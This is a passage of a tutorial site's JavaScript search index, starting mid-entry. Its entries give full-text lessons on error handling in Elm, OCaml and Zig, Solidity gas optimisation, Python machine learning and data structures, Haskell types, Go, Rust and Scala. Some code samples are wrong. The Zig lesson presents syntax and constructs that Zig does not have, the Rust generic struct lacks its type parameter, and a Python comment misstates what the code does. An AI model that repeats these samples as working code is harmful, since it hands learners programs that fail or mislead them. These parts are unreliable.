big..\" else Ok age Step 2 − Import the module in elm package and execute as given below\nE:\\ElmWorks\\ElmRepo\\15_ErrorHandling\\15_Code\u003e elm repl ---- elm-repl 0.18.0 ----------------------------------------------------------- :help for help, :exit to exit, more at -------------------------------------------------------------------------------- \u003e import ResultDemo exposing (..) \u003e userId Ok 10 : Result.Result String Int \u003e emailId Err \"Not valid emailId\" : Result.Result String Int \u003e isReasonableAge \"10\" Ok 10 : Result.Result String Int \u003e isReasonableAge \"abc\" Err \"That is not a age!\" : Result.Result String Int "
            }
        );
    index.add(
            {
                id:  102 ,
                href: "\/tutorials\/docs\/ocaml\/ocaml\/error_handling_in_ocaml\/",
                title: "Error Handling in OCaml",
                description: "OCaml is a multi-paradigm programming language, an extension of the Caml language, and a member of the ML (Meta Language) family.",
                content: "Error handling is a critical aspect of any programming language, ensuring that your program can gracefully handle unexpected situations. This guide covers the various techniques for error handling in OCaml, including using exceptions, the result type, and custom error types.\nIntroduction to Error Handling in OCaml linkOCaml provides several mechanisms for error handling. The primary methods are:\nExceptions: A traditional way to handle errors. Result Type: A functional approach to handle errors and results. Custom Error Types: Define your own error types for more control and readability. Using Exceptions linkRaising Exceptions linkIn OCaml, exceptions can be raised using the raise keyword. The standard library provides several predefined exceptions like Invalid_argument, Failure, and Not_found.\nlet divide x y = if y = 0 then raise (Invalid_argument \"Division by zero\") else x / y Handling Exceptions linkExceptions can be caught using the try...with construct.\nlet safe_divide x y = try divide x y with | Invalid_argument msg -\u003e Printf.printf \"Error: %s\\n\" msg; 0 Custom Exceptions linkYou can define your own exceptions for more specific error handling.\nexception My_error of string let my_function x = if x \u003c 0 then raise (My_error \"Negative value not allowed\") else x * 2 let () = try let result = my_function (-1) in Printf.printf \"Result: %d\\n\" result with | My_error msg -\u003e Printf.printf \"Custom error: %s\\n\" msg Using the Result Type linkThe result type is a more functional way to handle errors, particularly useful in functional programming paradigms.\nBasic Usage linkThe result type is defined as:\ntype ('a, 'b) result = Ok of 'a | Error of 'b Error Handling with Result linkUsing the result type, you can handle errors without exceptions.\nlet safe_divide x y = if y = 0 then Error \"Division by zero\" else Ok (x / y) let handle_result = function | Ok v -\u003e Printf.printf \"Result: %d\\n\" v | Error msg -\u003e Printf.printf \"Error: %s\\n\" msg let () = let result = safe_divide 10 0 in handle_result result Creating Custom Error Types linkFor more complex error handling, you can define custom error types.\ntype my_error = | Division_by_zero | Negative_value of int | Unknown_error of string let divide x y = if y = 0 then Error Division_by_zero else if x \u003c 0 then Error (Negative_value x) else Ok (x / y) let handle_my_error = function | Division_by_zero -\u003e Printf.printf \"Error: Division by zero\\n\" | Negative_value v -\u003e Printf.printf \"Error: Negative value %d\\n\" v | Unknown_error msg -\u003e Printf.printf \"Error: %s\\n\" msg let () = match divide (-10) 0 with | Ok v -\u003e Printf.printf \"Result: %d\\n\" v | Error e -\u003e handle_my_error e Best Practices link Use Exceptions for Truly Exceptional Situations: Reserve exceptions for cases that are truly exceptional and not part of the normal operation. Use Result Type for Recoverable Errors: For errors that are expected and can be recovered from, prefer the result type. Document Your Error Types: Clearly document the possible errors your functions can produce, especially if using custom error types. Leverage Pattern Matching: Use pattern matching extensively to handle different error cases explicitly. Combine Methods: Sometimes a combination of exceptions and result types makes sense, especially in large applications where different modules might have different error-handling strategies. Conclusion linkError handling in OCaml is flexible and can be adapted to suit different needs, from simple scripts to large, complex applications. By understanding and utilizing exceptions, the result type, and custom error types, you can write robust and maintainable OCaml programs.\n"
            }
        );
    index.add(
            {
                id:  103 ,
                href: "\/tutorials\/docs\/zig\/zig\/error_handling_in_zig\/",
                title: "Error Handling in Zig",
                description: "Zig is a general-purpose programming language and toolchain for maintaining robust, optimal, and reusable software.",
                content: "Error handling is an essential aspect of writing robust and reliable software. Zig provides a powerful and ergonomic error handling mechanism that ensures safety and correctness while dealing with errors. In this tutorial, we’ll explore Zig’s error handling features, including error sets, error unions, and error propagation patterns.\nError Sets linkAn error set in Zig is similar to an enum, where each error in the set is a value. Error sets allow you to define a set of named errors that a function can return.\nDefining Error Sets linkTo define an error set in Zig, use the error keyword followed by a block containing the names of individual errors.\nconst FileError = error{ FileNotFound, PermissionDenied, ReadError, WriteError, }; Returning Errors linkFunctions can return errors from the defined error set using the ! operator in the return type.\nfn readFile(path: []const u8) ![]const u8 { // Attempt to read the file. const fileContents = try std.fs.readFileAlloc(path); return fileContents; } Handling Errors linkWhen calling a function that returns an error, you can use the try keyword to propagate the error or handle it explicitly using a catch block.\npub fn main() !void { const path = \"example.txt\"; var fileContents: []const u8; catch FileError =\u003e |err| { std.debug.print(\"Error reading file: {}\\n\", .{err}); return err; }; // Use the file contents... } Error Unions linkError unions allow functions to return either a value or an error. This is useful when a function can fail in multiple ways, and each failure mode may require different handling.\nDefining Error Unions linkTo define an error union in Zig, use the error? syntax in the return type.\nfn openFile(path: []const u8) !std.fs.File { const file = std.fs.File.open(path); return file catch |err| error.OpenFileFailed; } Handling Error Unions linkWhen calling a function that returns an error union, you can use pattern matching to handle both success and failure cases.\npub fn main() !void { const path = \"example.txt\"; var file: std.fs.File; switch openFile(path) { std.fs.File =\u003e |f| { file = f; // File opened successfully... } error.OpenFileFailed =\u003e { std.debug.print(\"Failed to open file.\\n\", .{}); return .OpenFileFailed; } } } Error Propagation Patterns linkZig provides several patterns for error propagation, allowing you to choose the most appropriate approach based on your application’s requirements.\nPropagating Errors Up the Call Stack linkFunctions can propagate errors up the call stack using the try keyword, allowing errors to be handled at higher levels of abstraction.\nfn processFile(path: []const u8) !void { const fileContents = try readFile(path); // Process the file contents... } Handling Errors Locally linkFunctions can handle errors locally using catch blocks, providing a way to recover from errors or perform cleanup operations.\npub fn main() !void { const path = \"example.txt\"; var fileContents: []const u8; catch FileError =\u003e |err| { std.debug.print(\"Error reading file: {}\\n\", .{err}); return err; }; // Use the file contents... } Conclusion linkZig’s error handling mechanism provides a robust and flexible way to handle errors in your applications. By leveraging error sets, error unions, and error propagation patterns, you can write code that is both safe and reliable, ensuring a smooth user experience even in the face of unexpected failures.\n"
            }
        );
    index.add(
            {
                id:  104 ,
                href: "\/tutorials\/docs\/solidity\/solidity\/essential_gas_optimization\/",
                title: "Essential Gas Optimization Techniques in Solidity",
                description: "Gas optimization is key in smart contract and will prevent your protocols from becoming very expensive to make requests since gas prices would be very high.",
                content: "Ethereum gas fees have long been a concern for users. Although the recent Ethereum Proof-of-Stake merge introduced a more energy-efficient system, it had little effect on gas fees. To maintain high standards, minimize risk, write clean code, and create secure, cost-effective smart contracts, it is critical to know the techniques for optimizing gas with Solidity.\nIn this section on the best Solidity gas optimization tips and techniques, you will learn advanced, real-world, and tested strategies taught by top-notch web3 developers to reduce the gas costs of your smart contracts.\nUnderstanding Gas and Gas Optimization in Solidity linkGas is the unit of measurement for the computational effort required to perform operations on the Ethereum network. Solidity gas optimization involves making your smart contract code less expensive to execute.\nEvery Ethereum transaction requires computational resources, and the fee for these resources is referred to as gas. When a smart contract is compiled, it is converted into a series of “operation codes” or opcodes. Each opcode has a predefined gas cost, representing the computational work needed for that operation.\nThe goal of optimization is to reduce the number of operations needed to run a smart contract. Optimized contracts not only lower gas costs but also protect against malicious misuse.\nKey Solidity Gas Optimization Techniques link1. Use Mappings Instead of Arrays linkArrays and mappings are two data types in Solidity used to describe lists of data. While arrays are packable and iterable, mappings are less expensive.\nArray Example:\nstring languages[]; languages = [\"go\", \"python\", \"solidity\"]; Mapping Example:\nmapping(uint =\u003e string) public languages; constructor() public { languages[0] = \"go\"; languages[1] = \"python\"; languages[2] = \"solidity\"; } Use mappings to manage data lists to conserve gas, except when iteration is required or data types can be packed. Mappings allow direct access to values without iteration.\n2. Enable the Solidity Compiler Optimizer linkThe Solidity compiler optimizer simplifies complex expressions, reducing code size and execution costs. It optimizes inline operations, deployment costs, and function call costs.\nExample Settings:\nmodule.exports = { solidity: { version: \"0.8.9\", settings: { optimizer: { enabled: true, runs: 10000, }, }, }, }; 3. Minimize On-Chain Data linkReducing on-chain data storage lowers gas costs. Save only critical data on-chain and keep other data off-chain. Avoid looping through large arrays and batch operations to reduce gas consumption.\n4. Use Indexed Events linkEvents in Solidity notify users of blockchain activities. Indexed events can be searched using indexed parameters as filters, improving efficiency and reducing overall gas usage.\nExample:\nevent myFirstEvent(address indexed sender, uint256 indexed amount, string message); 5. Be Cautious with uint8 linkUsing uint8 can increase gas costs because the EVM handles 32 bytes at a time. For storage values, using uint256 is often more efficient unless multiple small variables can be packed into a single storage slot.\nLess Efficient:\ncontract A { uint8 a = 0; } More Efficient:\ncontract A { uint a = 0; // or uint256 } 6. Pack Your Variables linkPack small-sized state variables sequentially to save storage space. This reduces gas costs by combining multiple reads or writes into a single operation.\nBefore:\ncontract MyContract { uint128 c; uint256 b; uint128 a; } After:\ncontract Leggo { uint128 a; uint128 c; uint256 b; } 7. Free Up Unused Storage linkDeleting unused variables frees up space and earns a gas refund. Use the delete keyword or assign default values to remove unused storage.\nExample:\ndelete myVariable; // or myInt = 0; 8. Store Data in Calldata Instead of Memory linkFor certain function parameters, storing data in calldata instead of memory is more cost-effective if the data only needs to be read.\nCalldata Example:\nfunction func2(uint[] calldata nums) external { for (uint i = 0; i \u003c nums.length; ++i) { ... } } Memory Example:\nfunction func1(uint[] memory nums) external { for (uint i = 0; i \u003c nums.length; ++i) { ... } } 9. Use Immutable and Constant linkUse immutable and constant keywords to limit changes to state variables. Constant variables cannot be changed after compilation, while immutable variables can be set within the constructor.\nExample:\ncontract MyContract { uint256 constant b = 10; uint256 immutable a; constructor() { a = 5; } } 10. Use the External Visibility Modifier linkUsing the external function visibility modifier can optimize gas usage. Unlike public, external functions are less costly to call from outside the contract.\nExample:\nfunction one() public view returns (string memory) { return message; } function two() external view returns (string memory) { return message; } By mastering these techniques, you can create efficient, cost-effective smart contracts that optimize gas usage and enhance the overall performance of your Ethereum-based applications.\n"
            }
        );
    index.add(
            {
                id:  105 ,
                href: "\/tutorials\/docs\/python\/python\/python_for_machine_learning\/",
                title: "Essentials of Python for Machine Learning: Libraries, Concepts, and Model Building",
                description: "Embark on your machine learning journey with Python. This guide covers key libraries like NumPy, Pandas, Matplotlib, and Scikit-Learn, introduces fundamental machine learning concepts, and walks you through building a basic model to kickstart your machine learning projects.",
                content: "Introduction linkPython, with its rich ecosystem and accessible syntax, has become the go-to language for many machine learning practitioners. This section will provide an in-depth exploration of Python’s most important machine learning libraries, introduce fundamental concepts, and demonstrate model implementation.\nIn-Depth Libraries Overview linkNumPy linkNumPy is essential for numerical computing in Python. It provides efficient storage and operations for large n-dimensional arrays, which are the backbone of data manipulation and scientific computing in Python.\nimport numpy as np # Create an array with NumPy data = np.array([[1, 2], [3, 4], [5, 6]]) print(\"Original Array:\\n\", data) # Basic operations data_transposed = data.T print(\"Transposed Array:\\n\", data_transposed) # Matrix multiplication data_product = np.dot(data, data_transposed) print(\"Matrix Product:\\n\", data_product) NumPy arrays provide significantly more efficient storage and data operations than Python lists, especially as data grows.\nPandas linkPandas is built on NumPy and makes manipulating tabular data easy. It introduces two key data structures: DataFrame and Series, which allow for robust data manipulation and analysis.\nimport pandas as pd # Creating a DataFrame from a dictionary df = pd.DataFrame({ 'A': range(1, 5), 'B': pd.Timestamp('20230101'), 'C': pd.Series(1, index=list(range(4)), dtype='float32'), 'D': np.array([3] * 4, dtype='int32'), 'E': pd.Categorical([\"test\", \"train\", \"test\", \"train\"]), 'F': 'foo' }) print(\"DataFrame:\\n\", df) # Data selection and filtering print(\"Select column A:\\n\", df['A']) print(\"Filter rows where D \u003e 2:\\n\", df[df['D'] \u003e 2]) Pandas is particularly useful for data cleaning, transformation, and analysis.\nMatplotlib linkMatplotlib is the primary plotting library in Python. It provides tools for making static, interactive, and animated visualizations in Python.\nimport matplotlib.pyplot as plt import numpy as np # Data for plotting t = np.arange(0.0, 2.0, 0.01) s = 1 + np.sin(2 * np.pi * t) fig, ax = plt.subplots() ax.plot(t, s) ax.set(xlabel='time (s)', ylabel='voltage (mV)', title='Simple Plot') ax.grid() plt.show() Effective visualization with Matplotlib helps in understanding data and in conveying precise insights about the data.\nScikit-Learn linkScikit-Learn simplifies machine learning with Python. It includes support for numerous algorithms and utilities for creating and assessing models.\nfrom sklearn import datasets from sklearn.model_selection import train_test_split from sklearn.linear_model import LinearRegression from sklearn.metrics import mean_squared_error # Load the diabetes dataset diabetes = datasets.load_diabetes() # Split data into training and test sets X_train, X_test, y_train, y_test = train_test_split(diabetes.data, diabetes.target, test_size=0.2) # Create linear regression object regr = LinearRegression() # Train the model regr.fit(X_train, y_train) # Make predictions diabetes_y_pred = regr.predict(X_test) # The mean squared error print('Mean squared error: %.2f' % mean_squared_error(y_test, diabetes_y_pred)) Scikit-Learn’s functionality covers a wide range of machine learning tasks from preprocessing data to evaluating models.\nFundamental Machine Learning Concepts linkMachine learning can be broadly categorized into several types:\nSupervised Learning: Models predict outputs based on input data. Example tasks include regression and classification. Unsupervised Learning: Models identify structure from input data, like clustering and association. Reinforcement Learning: Models make sequences of decisions by learning policies based on observed rewards. Building a Machine Learning Model linkHere’s a\nstep-by-step guide to building a logistic regression model using Scikit-Learn, a common model for binary classification.\nfrom sklearn.model_selection import train_test_split from sklearn.datasets import load_iris from sklearn.linear_model import LogisticRegression from sklearn.metrics import accuracy_score # Load data iris = load_iris() X, y = iris.data, iris.target # Split the data into training and testing sets X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.3, random_state=42) # Initialize the model model = LogisticRegression(max_iter=200) # Train the model model.fit(X_train, y_train) # Make predictions predictions = model.predict(X_test) # Evaluate the model print(\"Model Accuracy:\", accuracy_score(y_test, predictions)) This example illustrates how to train and evaluate a logistic regression model, which is commonly used for predicting categorical outcomes.\nConclusion linkThis extensive guide has covered essential Python libraries for machine learning, fundamental machine learning concepts, and a detailed walkthrough of building a logistic regression model. These components provide a solid foundation for diving into more advanced machine learning techniques and applications in Python.\n"
            }
        );
    index.add(
            {
                id:  106 ,
                href: "\/tutorials\/docs\/python\/python\/python_advanced_data_structures\/",
                title: "Exploring Advanced Data Structures in Python: Collections and Priority Queues",
                description: "Enhance your Python programming skills by mastering advanced data structures from the collections module and utilizing heapq for efficient priority queues. This guide provides detailed insights into these powerful tools with practical examples.",
                content: "Introduction linkAdvanced data structures are crucial for creating efficient algorithms and applications. Python’s standard library offers several modules that contain advanced data structures which can significantly simplify complex programming tasks.\nCollections Module linkThe collections module provides alternatives to Python’s general purpose built-in containers. We will focus on Counter, deque, and OrderedDict.\nCounter linkCounter is a subclass of dict that is used to count objects. It simplifies counting and frequency analysis tasks.\nfrom collections import Counter # Example usage of Counter words = [\"apple\", \"banana\", \"apple\", \"orange\", \"banana\", \"apple\"] word_counts = Counter(words) print(word_counts) # Counter({'apple': 3, 'banana': 2, 'orange': 1}) # Most common elements print(word_counts.most_common(2)) # [('apple', 3), ('banana', 2)] Counter automatically counts the frequency of each element in the list, providing a dictionary-like object where elements are keys and counts are values. The most_common() method returns the most frequent elements.\ndeque linkdeque, pronounced “deck”, is a list-optimized container that provides fast appends and pops from both ends.\nfrom collections import deque # Creating and using deques d = deque(\"ghi\") # Make a new deque with three items for elem in d: # iterate over the deque's elements print(elem.upper()) d.append('j') # Add to the right d.appendleft('f') # Add to the left print(\"Deque after additions:\", list(d)) d.pop() # Remove from the right d.popleft() # Remove from the left print(\"Deque after deletions:\", list(d)) deque supports thread-safe, memory-efficient appends and pops from either side of the deque with approximately the same O(1) performance in either direction.\nOrderedDict linkOrderedDict maintains the order of keys as they were initially inserted. This was particularly useful before Python 3.7 introduced regular dicts that preserve order. However, OrderedDict still has its uses, such as when reordering dict items is needed.\nfrom collections import OrderedDict # Maintaining insertion order ordered_dict = OrderedDict([('red', 1), ('green', 2), ('blue', 3)]) print(\"OrderedDict:\", ordered_dict) # Reordering an OrderedDict ordered_dict.move_to_end('red', last=False) print(\"OrderedDict after moving 'red' to the end:\", ordered_dict) heapq for Priority Queues linkThe heapq module provides an implementation of the heap queue algorithm, also known as the priority queue algorithm.\nUsing heapq link import heapq # Example of a priority queue numbers = [3, 1, 4, 1, 5, 9, 2, 6, 5] heapq.heapify(numbers) # Transform list into a heap print(\"Heap:\", numbers) heapq.heappush(numbers, 7) # Add element print(\"Heap after adding an element:\", numbers) smallest = heapq.heappop(numbers) # Pop the smallest item print(\"Smallest element:\", smallest) print(\"Heap after popping the smallest element:\", numbers) heapq transforms a regular list into a heap where the smallest element is always at the index 0. This is useful for tasks where you continually need to access and remove the smallest element without performing a full sort.\nConclusion linkUnderstanding and utilizing advanced data structures like those in the collections module and the heapq module can significantly enhance the efficiency and performance of your Python applications. This guide has provided a detailed look into some of these structures, illustrating their usage and benefits in real-world scenarios.\n"
            }
        );
    index.add(
            {
                id:  107 ,
                href: "\/tutorials\/docs\/haskell\/haskell\/advanced-data-types-in-haskell\/",
                title: "Exploring Advanced Data Types in Haskell",
                description: "Dive deep into Haskell's advanced data types including Tuples, Maybe, Either types, Records, and Algebraic Data Types (ADTs). Learn how to leverage pattern matching and guards for more robust Haskell programming.",
                content: "Introduction: linkWelcome back to our in-depth Haskell series! Today, we’re exploring some of Haskell’s most powerful features—its advanced data types. Haskell offers a variety of sophisticated data structures that help manage complex data more efficiently and safely. In this guide, we will cover Tuples, Maybe and Either types, Records, and Algebraic Data Types (ADTs). Additionally, we’ll delve into the powerful concepts of pattern matching and guards, essential tools that complement these data types perfectly. By understanding these elements, you can take full advantage of Haskell’s type system to write clearer, more maintainable code.\nTuples, Maybe, and Either Types linkTuples:\nTuples are simple yet versatile data structures in Haskell that group together a fixed number of elements, potentially of different types. They are particularly useful for returning multiple values from a function.\nmyTuple :: (Int, String) myTuple = (42, \"Answer\") Maybe Type:\nThe Maybe type is used to represent values that may or may not be present. It’s a safe way to handle optional data without resorting to null references, thus avoiding many common bugs.\nfindElement :: Eq a =\u003e a -\u003e [a] -\u003e Maybe a findElement _ [] = Nothing findElement x (y:ys) | x == y = Just y | otherwise = findElement x ys Either Type:\nEither is similar to Maybe but can return a value on failure, typically an error. It’s useful for operations that may fail and you want to return an explanation of the failure.\ndivide :: Int -\u003e Int -\u003e Either String Int divide _ 0 = Left \"Cannot divide by zero.\" divide x y = Right (x `div` y) Records and Algebraic Data Types (ADTs) linkRecords:\nRecords are enhanced tuples with a syntax that allows for fields to be named, improving code readability and maintainability.\ndata Person = Person { name :: String, age :: Int } johnDoe :: Person johnDoe = Person {name = \"John Doe\", age = 30} Algebraic Data Types (ADTs):\nADTs are a fundamental part of Haskell, allowing you to construct types in ways that are both expressive and precise. They are used to model data in a way that closely matches the problem domain.\ndata Shape = Circle Float | Rectangle Float Float | Square Float area :: Shape -\u003e Float area (Circle r) = pi * r * r area (Rectangle l w) = l * w area (Square s) = s * s Pattern Matching and Guards linkPattern Matching:\nPattern matching is a technique used to deconstruct data types directly in the function’s definition, leading to clear and concise code.\ndescribe :: Shape -\u003e String describe (Circle _) = \"Round shape\" describe (Rectangle _ _) = \"Four sides, different lengths\" describe (Square _) = \"Four sides, equal lengths\" Guards:\nGuards are a way to add more precise conditions to pattern matches, making them more like conditional statements that are checked in sequence.\nclassifyAge :: Person -\u003e String classifyAge Person { age = a } | a \u003c 13 = \"Child\" | a \u003c 20 = \"Teenager\" | otherwise = \"Adult\" Conclusion:\nUnderstanding and using Haskell’s advanced data types can significantly enhance your ability to write safe and effective code. By combining ADTs, pattern matching, and guards, you can model complex data scenarios with precision and clarity. Practice these concepts to master the type-rich environment that Haskell offers, and you’ll find your Haskell programming becoming more expressive and robust.\nFrequently Asked Questions:\nQ: When should I use ADTs over simpler types like tuples? A: Use ADTs when you need to model complex data structures with clearly defined variants, which can greatly improve the readability and reliability of your code.\nQ: How can I improve my understanding of pattern matching and guards? A: Experiment with different data structures and scenarios. Writing more code that uses these features will deepen your understanding and proficiency.\n"
            }
        );
    index.add(
            {
                id:  108 ,
                href: "\/tutorials\/docs\/golang\/golang\/advanced-features-of-go\/",
                title: "Exploring Advanced Features of Go",
                description: "Dive deep into the advanced features of Go programming, including reflection, interfaces and type assertions, and sophisticated concurrency patterns to enhance your Go applications.",
                content: "Introduction:\nHello, advanced Go programmers! As your journey with Go deepens, mastering its advanced features can dramatically enhance your coding toolkit. This blog post delves into some of the more sophisticated aspects of Go, such as reflection, interfaces and type assertions, and advanced concurrency patterns. These features, when harnessed correctly, can help you build highly efficient, dynamic, and robust applications. Let’s explore these complex yet powerful components of Go to unlock new programming potentials.\n1. Reflection\nReflection in Go, provided by the reflect package, allows you to inspect the type and value of objects at runtime, making it possible to write flexible and generic functions that work differently based on the type of arguments they receive.\na. Using Reflection:\nReflection is particularly useful when you need to deal with types that are unknown at compile time. You can use reflection to dynamically access object methods or fields:\nimport \"reflect\" func printFields(v interface{}) { val := reflect.ValueOf(v) for i := 0; i \u003c val.NumField(); i++ { field := val.Field(i) fmt.Println(\"Field:\", i, \"has value:\", field.Interface()) } } type MyStruct struct { Field1 string Field2 int } func main() { ms := MyStruct{\"Hello\", 42} printFields(ms) } b. Caution with Reflection:\nWhile powerful, reflection should be used judiciously. It can make your code harder to understand and maintain, and it often comes with a performance cost compared to type-specific code.\n2. Interfaces and Type Assertions\nInterfaces in Go provide a way to specify the behavior of an object; if a type implements those methods, it implements the interface. Type assertions and type switches provide powerful ways to retrieve the dynamic type of interface values.\na. Dynamic Interface Usage:\nInterfaces are a core part of Go’s type system. They are implicitly implemented, meaning that there’s no need to declare that a type implements a specific interface:\ntype Greeter interface { Greet() string } type English struct{} func (English) Greet() string { return \"Hello!\" } type Spanish struct{} func (Spanish) Greet() string { return \"¡Hola!\" } func greet(g Greeter) { fmt.Println(g.Greet()) } func main() { english := English{} spanish := Spanish{} greet(english) greet(spanish) } b. Type Assertions and Switches:\nType assertions allow you to retrieve the concrete type of an interface variable:\nvar i interface{} = \"hello\" s := i.(string) fmt.Println(s) s, ok := i.(string) fmt.Println(s, ok) f, ok := i.(float64) fmt.Println(f, ok) Type switches are a form of syntax that allows you to compare the type of an interface:\nswitch v := i.(type) { case int: fmt.Println(\"Integer:\", v) case string: fmt.Println(\"String:\", v) default: fmt.Println(\"Unknown type!\") } 3. Advanced Concurrency Patterns\nGo’s concurrency primitives (goroutines and channels) can be used to implement more complex concurrency patterns.\na. Fan-out, Fan-in:\nThis pattern involves starting multiple goroutines to handle input tasks (fan-out) and then combining the results in a single goroutine (fan-in).\nb. Worker Pools:\nImplementing a worker pool can help manage resource utilization by limiting the number of goroutines running concurrently:\nfunc worker(id int, jobs \u003c-chan int, results chan\u003c- int) { for j := range jobs { fmt.Println(\"worker\", id, \"started job\", j) time.Sleep(time.Second) fmt.Println(\"worker\", id, \"finished job\", j) results \u003c- j * 2 } } func main() { const numJobs = 5 jobs := make(chan int, numJobs) results := make(chan int, numJobs) for w := 1; w \u003c= 3; w++ { go worker(w, jobs, results) } for j := 1; j \u003c= numJobs; j++ { jobs \u003c- j } close(jobs) for a := 1; a \u003c= numJobs; a++ { \u003c-results } } Conclusion:\nBy mastering these advanced features of Go, you can enhance the flexibility, efficiency, and robustness of your applications. Whether it’s leveraging reflection\nfor more dynamic code, utilizing interfaces for polymorphism, or employing sophisticated concurrency patterns, Go offers a powerful suite of tools for the seasoned programmer. Dive into these concepts, experiment with them, and watch how they can transform your Go development approach.\nNow, if you are interested in upskilling in 2024 with AI development, check out this 6 AI advanced projects with Go where you learng about building with AI and getting the best knowledge there is currently. Here’s the link\nFrequently Asked Questions:\nQ: When should I use reflection? A: Use reflection sparingly; it’s most suitable for situations where you need a high degree of flexibility such as in serialization libraries or implementing generic functions.\nQ: How do interfaces improve code in Go? A: Interfaces allow you to write functions that are more flexible and modular, accepting any type that implements the required methods.\nQ: What are the best practices for managing complex concurrency? A: Keep your design simple, use channels for communication, avoid shared state, and use the right concurrency patterns to solve your specific problem.\n"
            }
        );
    index.add(
            {
                id:  109 ,
                href: "\/tutorials\/docs\/rust\/rust\/exploring_advanced_types_rust\/",
                title: "Exploring Advanced Types in Rust: Structs and Enums",
                description: "Enhance your Rust expertise by mastering advanced struct usage and exploring enums with data. This detailed guide provides an in-depth look at sophisticated patterns and techniques for struct and enum definitions, offering practical coding examples and best practices to maximize code efficiency and maintainability.",
                content: "Introduction linkAdvanced type definitions in Rust, including sophisticated struct patterns and enums with data, allow for more expressive and efficient code. This post explores these advanced types, demonstrating how to leverage them to build complex and type-safe Rust applications.\nAdvanced Struct Usage linkStructs in Rust are not just simple collections of data fields; they can also include functionality and be used in complex patterns.\nUsing Derive Attributes:\nRust allows structs to automatically implement traits like Debug, Clone, Copy, and Default using derive attributes. #[derive(Debug, Clone, Copy)] struct Point { x: i32, y: i32, } Generic Structs:\nStructs can be generic, allowing them to be used with different types of data. struct Point { x: T, y: T, } let integer_point = Point { x: 5, y: 10 }; let float_point = Point { x: 1.0, y: 4.0 }; Newtype Pattern:\nWrapping a single value in a struct can provide type safety and encapsulation without runtime overhead. struct Millimeters(u32); struct Meters(u32); let length = Millimeters(5000); let altitude = Meters(3); Tuple Structs:\nStructs can be defined without named fields, useful for simple scenarios or when you need a fixed-size collection of items. struct Color(i32, i32, i32); let black = Color(0, 0, 0); Enums with Data linkEnums in Rust can carry data along with variant labels, enabling pattern matching that is both expressive and safe.\nDefining Enums with Data:\nEach variant of an enum can hold different types and amounts of data. enum Message { Quit, Move { x: i32, y: i32 }, Write(String), ChangeColor(i32, i32, i32), } Pattern Matching with Enums:\nRust’s match control flow operator allows you to unpack enums cleanly and safely handle each variant. fn process_message(msg: Message) { match msg { Message::Quit =\u003e { println!(\"Quit variant\"); }, Message::Move { x, y } =\u003e { println!(\"Move to x: {}, y: {}\", x, y); }, Message::Write(text) =\u003e { println!(\"Text message: {}\", text); }, Message::ChangeColor(r, g, b) =\u003e { println!(\"Change color to Red: {}, Green: {}, Blue: {}\", r, g, b); }, } } Using Enums for State Management:\nEnums are excellent for managing state within applications, especially when combined with match. enum ConnectionState { Connected, Disconnected, Connecting(u32), } Conclusion linkAdvanced structs and enums are powerful tools in the Rust programmer’s toolkit, offering flexibility, safety, and expressive power. By mastering these types, you can create robust applications that take full advantage of Rust’s type system.\n"
            }
        );
    index.add(
            {
                id:  110 ,
                href: "\/tutorials\/docs\/scala\/scala\/arrays_in_scala\/",
                title: "Exploring Arrays in Scala",
                description: "Learn more about arrays in scala",
                content: "In the realm of Scala programming, arrays serve as fundamental data structures for storing collections of elements in a contiguous memory block. They provide efficient random access to elements and support various operations crucial for manipulating data. In this blog post, we will delve into the world of arrays in Scala, covering their creation, manipulation, common operations, and best practices for leveraging them effectively in your code.\nWhat is an Array in Scala? linkAn array in Scala is a mutable, fixed-size collection of elements of the same type. Unlike lists or other collections, arrays offer direct access to elements via their index, making them suitable for scenarios where fast element retrieval is essential.\nCreating Arrays linkIn Scala, you can create arrays using several approaches:\nUsing Array Object:\n// Creating an array of integers val numbers: Array[Int] = Array(1, 2, 3, 4, 5) // Creating an array of strings val fruits: Array[String] = Array(\"Apple\", \"Banana\", \"Orange\") Using new Keyword:\n// Creating an array of doubles with a specified size val prices: Array[Double] = new Array[Double](10) Accessing Elements linkAccessing elements in an array is straightforward using the index notation (array(index)):\nval firstElement = numbers(0) // Accessing the first element of `numbers` array Array Operations linkArrays support various operations that facilitate manipulation and transformation of data:\nUpdating Elements:\nnumbers(2) = 10 // Updating the third element of `numbers` array to 10 Iterating Over Elements:\nfor (fruit \u003c- fruits) { println(fruit) } Array Methods: Scala arrays provide several useful methods such as map, filter, foldLeft, etc., for functional programming operations:\nval doubledNumbers = numbers.map(_ * 2) Concatenation and Slicing: Arrays can be concatenated using ++ and sliced using slice method:\nval combinedArray = numbers ++ prices val slicedArray = fruits.slice(0, 2) // Slicing from index 0 to 1 Mutable vs Immutable Arrays linkScala arrays are mutable by default, meaning you can modify elements after initialization. However, if immutability is preferred for functional programming style, consider using Vector or other immutable collections provided by Scala’s standard library.\nBest Practices link Type Safety: Ensure arrays are typed correctly (Array[Int], Array[String], etc.) to avoid runtime errors.\nPrefer Immutable Collections: Use immutable collections (Vector, List, etc.) where mutability is unnecessary to leverage Scala’s functional programming capabilities.\nPerformance Considerations: Arrays offer efficient random access but may require careful management of mutable state to avoid unintended side effects.\nConclusion linkArrays in Scala provide a powerful mechanism for managing collections of data with direct access to elements by index. They are particularly useful in scenarios requiring high-performance data manipulation and transformation. By understanding how to create, manipulate, and optimize arrays, you can effectively harness their capabilities to build scalable and efficient Scala applications.\nIn summary, mastering arrays in Scala expands your toolkit for handling data structures efficiently, whether you’re developing algorithms, processing data, or building complex systems. Embrace arrays as a core feature of Scala and explore their versatility to elevate your programming skills and application performance.\n"
            }
        );
    index.add(
            {
                id:  111 ,
                href: "\/tutorials\/docs\/golang\/golang\/concurrency-in-go-channels\/",
                title: "Exploring Channels in Go",
                description: "Discover the power of channels in Go for synchronizing and communicating between goroutines. Learn the difference between buffered and unbuffered channels and how to use the select statement for efficient channel operations.",
